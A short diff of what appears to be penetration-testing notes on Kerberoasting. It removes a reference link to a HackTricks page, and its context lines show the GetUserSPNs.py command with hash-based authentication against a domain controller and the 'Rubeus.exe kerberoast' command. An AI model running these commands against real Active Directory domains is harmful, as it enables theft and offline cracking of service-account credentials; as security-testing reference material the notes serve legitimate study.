@@ -39,9 +39,7 @@ GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/
 Rubeus.exe kerberoast
 ```
 
-## Reference
 
-{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" %}
 
 
 
